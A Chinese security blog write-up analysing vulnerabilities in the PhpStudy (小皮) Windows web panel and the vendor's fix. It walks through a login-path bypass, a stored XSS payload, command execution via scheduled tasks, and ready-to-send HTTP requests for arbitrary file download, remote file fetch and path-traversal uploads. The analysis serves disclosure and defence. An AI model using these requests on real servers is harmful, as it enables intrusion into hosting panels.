#  小皮 Windows web 面板漏洞详解   
 蚁景网安   2024-12-24 08:31  
  
## 漏洞简介  
  
　　PhpStudy国内12年老牌公益软件，集安全、高效、功能与一体，已获得全球用户认可安装，运维也高效。支持一键LAMP、LNMP、集群、监控、网站、数据库、FTP、软件中心、伪静态、云备份、SSL、多版本共存、Nginx反向代理、服务器防火墙、web防火墙、监控大屏等100多项服务器管理功能。小皮 Windows web 面板存在存储型 xss 漏洞，结合后台计划任务即可实现 RCE。  
## 影响版本  
  
<table><thead style="text-align: left;line-height: 1.75;background: rgba(0, 0, 0, 0.05);font-weight: bold;color: rgb(63, 63, 63);"><tr><td style="text-align: left;line-height: 1.75;border-color: rgb(223, 223, 223);border-style: solid;border-width: 1px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);">操作系统</td><td style="text-align: left;line-height: 1.75;border-color: rgb(223, 223, 223);border-style: solid;border-width: 1px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);">影响版本</td></tr></thead><tbody><tr><td style="text-align: left;line-height: 1.75;border-color: rgb(223, 223, 223);border-style: solid;border-width: 1px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);">Windows</td><td style="text-align: left;line-height: 1.75;border-color: rgb(223, 223, 223);border-style: solid;border-width: 1px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);">V0.102 及其以下的版本</td></tr><tr><td style="text-align: left;line-height: 1.75;border-color: rgb(223, 223, 223);border-style: solid;border-width: 1px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);">Liunx</td><td style="text-align: left;line-height: 1.75;border-color: rgb(223, 223, 223);border-style: solid;border-width: 1px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);">V1.11 及其以下的版本</td></tr></tbody></table>  
  
　　因为我一边测试一边写文章，但是我发现下载下的新版本的已经添加了过滤，但是并没有更新日志。  
## 环境搭建  
  
　　从官网下载 小皮 windows 面板安装包  
  
　　https://www.xp.cn/windows-panel.html  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1JTmicfwfTIibCmTNvolIhvXzlze2nV1JIcFYcJib80KB6jb1ebcBZLYUg/640?wx_fmt=png "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1d1oIkXIhX89XrdJcgHhKjOPvgUPMcrGRWkKHfJkbsDExnLYJpph21g/640?wx_fmt=png "null")  
  
　　安装完成后会有一个初始信息文本，记录了小皮面板的登录地址以及账号密码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1LK0a3kJ2eOOA2Giaj1GCT8UWQmIPMraXRJhGvLVibZyTvFLfh9sHH4uw/640?wx_fmt=png "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a15PbQ58bJyUx5icLr0Vm755kJWsm05lawXuFrkMhs8PrR215oBVAZWIw/640?wx_fmt=png "null")  
## 漏洞复现  
### 绕过随机码  
  
　　我们注意到小皮面板后台默认开放在 9080 端口，后台登录 url 地址中会存在一个随机码，不添加随机码时返回信息为 404。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1oBTCibuiaGmopJsZPhWhbPvF40gic2ejl7lTaibyKuW2jibu1QdrQ58ykxg/640?wx_fmt=png "null")  
  
　　在程序中全局搜索和 404 相关的字样定位到 service/httpServer/Workerman/WebServer.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a17Nia68IXgBsSeaYfuMxJZNR8SZp1I4BWb6aWK6JqHTnDgSCNx21xchQ/640?wx_fmt=png "null")  
  
　　当添加请求头 X-Requested-With: XMLHttpRequest 就可以绕过随机码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1oicficibFnavjxdbWEjg9XhUU54faLFBF5edt614agZgzh0Pw40KibcA5A/640?wx_fmt=png "null")  
### 存储型 XSS  
  
　　我们在用户登录处的用户名插入弹窗 XSS 代码 验证是否存在漏洞  
```
<script>alert("xss")</script>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1Fo3KZ4XsNg4ibQOShEkibbo3ZAzWheHn303eV0agvEia55qZ2mNmfQqGw/640?wx_fmt=png "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1vKz7OgPp0A8jK31cpTibYu0DumricibwicQ0ick9bKq4ibbPMGXE1P09LmHA/640?wx_fmt=png "null")  
  
　　利用正确的用户名密码登录查看  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1z2ftJgQR4hSUwdmEt8k4fctpsdX83XjaOQJAZUzlv0UTkwoWsKgSpg/640?wx_fmt=png "null")  
  
　　我们发现成功的触发了存储型 xss  
  
　　我们查看登录时的数据包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1XVWvzZAo2vIDpOiaEmeRfG6XMeBQRNNBTib1bY5bxNEoaYoDSvryof8w/640?wx_fmt=png "null")  
  
　　service/app/account.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1mhjhUE6jAsRKxXnQBPIbbFSZJ9ic2ynaVQsHU5U4QKvELib7OJeS6kAQ/640?wx_fmt=png "null")  
  
　　\Account::login  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1tEmgLKGb1zCuvdEWswMFbR7hpNibjNIKHo9t3h80pKstMpkHcBrsRicA/640?wx_fmt=png "null")  
  
　　\Socket::request  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1tTY2tQoA8ficVjs0n9IEbF3hGiabpB6zFZB5iaOcnrHgCwAYUib0IGYSpA/640?wx_fmt=png "null")  
  
　　将信息保存起来，登录平台后会自动获取一次日志信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1qf6w1esHWP3FMYcHa1RrrLkXVQ6F3YrmWia2DG8IZvwgy5ibNhfRZd0Q/640?wx_fmt=png "null")  
  
　　service/app/log.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1f5nEGtibibiaT5TPzHicQ2sktmqYnTOdcDS5akpZMSOQbFHvtkRhY1kZng/640?wx_fmt=png "null")  
### 后台计划任务  
  
　　我们注意到后台有计划任务模块  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1BaiaTCv5LaC9m29N56ud1HjRIYDWGuEMN2kic9h8jQEITGeaqTLfIGfQ/640?wx_fmt=png "null")  
  
　　所以可以直接通过构造计划任务实现 RCE  
  
　　添加任务 -> 添加 shell 脚本 -> 构造 shell 脚本内容 -> 执行 shell 脚本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a14KaTyU4Yiaz2CAS0gEHiaoj3ib8qjvsQNaBM6iaiciaTMjlIv3wfFFQxRW9w/640?wx_fmt=png "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1h6uWLU44xa225gXUmWfZmVKlVxYkb0fEMXicv3tpWBNSkecCSkb9W0Q/640?wx_fmt=png "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a13kgcpjsf77ZVS49nMuCvuh2I1Yt9Kswc3icERQHyDBbZ4mP3J8IzA7A/640?wx_fmt=png "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1MUO2u41SnLHCu2MPjDNTde89TsnnaicGMadiaddU3abI9D4mdYyOgckQ/640?wx_fmt=png "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1uNTGicRavSLuaSG2aggEgBHbGVyB00UTSicSFxHQ0VP29RI4m42T4y4Q/640?wx_fmt=png "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a15QTBW7bV1JPje3Jibo4QM5cUMMjbRcdmK2oaZibfooAMXFbkWYnF2dgA/640?wx_fmt=png "null")  
  
　　成功执行命令  
  
　　结合原本的存储型 XSS，可以直接获取管理员的 Cookie 值然后实现后台计划任务命令执行，或者直接通过 js 文件实现类似 CSRF + 后台计划任务命令执行。  
### 任意文件下载  
  
　　构造数据包  
```
GET /service/app/files.php?type=download&file=L3Rlc3QudHh0 HTTP/1.1
Host: 192.168.222.139:9080
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://192.168.222.139:9080/C292CA
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=9c53f8f8c903d9412a3f0211
Connection: close
```  
  
　　file 的值是 base64 编码后的 /test.txt 成功读取文件内容  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1U2maL8MjuGe3JTBt30CnZrS64bqKURfdnzJK0XbCcXazvC1M2JbqpQ/640?wx_fmt=png "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a14HUibj3XbtPyaS9XDSqfToONANrN98cCzrtIgPumwaka2MJxrcxr0Pg/640?wx_fmt=png "null")  
  
　　service/app/files.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1kxlLoOaF4uV1tMfeQsgKNiaT1L7vsQjdt1RpDGGWClUlTZOkc5FNStQ/640?wx_fmt=png "null")  
  
　　文件下载通过 get 获取文件名，通过 base64 解码获取，没有校验，所以可以实现任意文件下载  
### 任意代码执行  
  
　　构造数据包  
```
POST /service/app/files.php?type=download_remote_file HTTP/1.1
Host: 192.168.222.139:9080
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://192.168.222.139:9080/C292CA
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=9c53f8f8c903d9412a3f0211
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 95

url=aHR0cDovLzE5Mi4xNjguMjIyLjE6ODAwMC8xLnR4dA==&download_to_file_folder=&newfilename=testing.txt
```  
  
　　url 是 base64 编码的 http://192.168.222.1:8000/1.txt  
```
 python2 -m SimpleHTTPServer 8000   #在本地开启 http 服务
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1nyZib5rISjzfLj35mGLY1HQqwZGCSIRPxFrWRup27ibKT4OCDrIs8r3w/640?wx_fmt=png "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a14hJHickyPV6KWAf33KQicIY4NoeKX2fl1n4fX6e9OffHShX61PG64y4Q/640?wx_fmt=png "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1MCkAlPNy7lV5j06LFhFIPTspYkZzsZy1RXF3dJ4kJiclQPH5UcAoS1w/640?wx_fmt=png "null")  
  
　　service/app/files.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1dN1HfZ10m3K9u0XguicR9CRVuicrcUROcksy64HpCNDxzZSu5RLln2icA/640?wx_fmt=png "null")  
  
　　通过 url 获取远程的下载地址，download_to_file_folder 指定下载文件文件夹，newfilename 指定保存文件的文件名  
### 任意文件上传  
  
　　构造数据包  
```
POST /service/app/files.php?type=file_upload HTTP/1.1
Host: 192.168.222.139:9080
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://192.168.222.139:9080/C292CA
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=9c53f8f8c903d9412a3f0211
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryE0tFhmmng2vwxftT
Content-Length: 288

------WebKitFormBoundaryE0tFhmmng2vwxftT
Content-Disposition: form-data; name="file_path"

/
------WebKitFormBoundaryE0tFhmmng2vwxftT
Content-Disposition: form-data; name="file"; filename="testing1.txt"
Content-type: image/jpg

qweqwe------WebKitFormBoundaryE0tFhmmng2vwxftT--
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1cJ8ernfC6AEXSNXpEDTHjDGw5SVStpyOKwttnRJ4ib6YxLbIPy9uvVw/640?wx_fmt=png "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1s0TF3ZUrMRlrOQwW0TvQttLlZ4enN35hSxia4zlekcxZh0nsbv1tBFg/640?wx_fmt=png "null")  
  
　　service/app/files.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1cGFNDMbUzhfeicKeebKd6I3Z5ute8QicLCBicneMGxImCH1QrmVW09hJA/640?wx_fmt=png "null")  
### 任意文件上传二  
  
　　构造数据包  
```
POST /service/app/files.php?type=save_file_contents HTTP/1.1
Host: 192.168.222.139:9080
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://192.168.222.139:9080/C292CA
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=9c53f8f8c903d9412a3f0211
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
file_path=/&file_name=test2.txt&txt_file_contents=qwerqwer
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1DOKibHZBeWFKczjHFWPoicMZzMO989tgLXWWsCOJicV5E9ZppXURuicH7g/640?wx_fmt=png "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1a7DZE5qm1G82OVVwARabWl3cOD1mkNIoluaUOlXMFfLicUBFw3rfPtw/640?wx_fmt=png "null")  
  
　　service/app/files.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1CdTCThFU3RA4kd9GAJckherQd9AibBmk5VTtmoMUAGkqVFs6YgRRicFw/640?wx_fmt=png "null")  
  
　　根据通过 post 传入的值 file_path 指定保存文件目录 file_name 指定文件保存名字 txt_file_contents 指定文件保存内容，未作任何过滤，可实现任意文件上传  
### 任意文件上传三  
  
　　构造数据包  
```
POST /service/app/databases.php?type=file_add HTTP/1.1
Host: 192.168.222.139:9080
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://192.168.222.139:9080/C292CA
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=9c53f8f8c903d9412a3f0211
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryE0tFhmmng2vwxftT
Content-Length: 312

------WebKitFormBoundaryE0tFhmmng2vwxftT
Content-Disposition: form-data; name="parent_dir"

../../../../../../../../
------WebKitFormBoundaryE0tFhmmng2vwxftT
Content-Disposition: form-data; name="file"; filename="testing2.txt"
Content-type: image/jpg

qweqwe------WebKitFormBoundaryE0tFhmmng2vwxftT--
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1X7E0Os6Ko3A4dtbYibRGlZRsRs59YPcCicNAQketdGJjOAc3aPkanWiaA/640?wx_fmt=png "null")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1SknX55LSvgRFAysmfDu1CRS5ia01dHjucNDeGlJWQwiabGbiamFzzNfKg/640?wx_fmt=png "null")  
  
　　service/app/databases.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a12po7gddmaynKsbMV96sYEIwjsPWrce5zXC8sUBZJ7Vc7Bv02HCOdnw/640?wx_fmt=png "null")  
## 漏洞修复  
  
　　在登录处添加了校验  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Lc8ToPamqrczTjww5x9C5a1YCT0WxeUaRd9UMSOzTsW7VgldjBcTLdUmTPibpJD5bfSvQBcqORczgg/640?wx_fmt=png "null")  
  
　　对传入的文件名的长度进行校验，同时对传入的字符串进行了 htmlspecialchars 处理  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
学习  
网安实战技能课程  
，戳  
“阅读原文”  
  
  
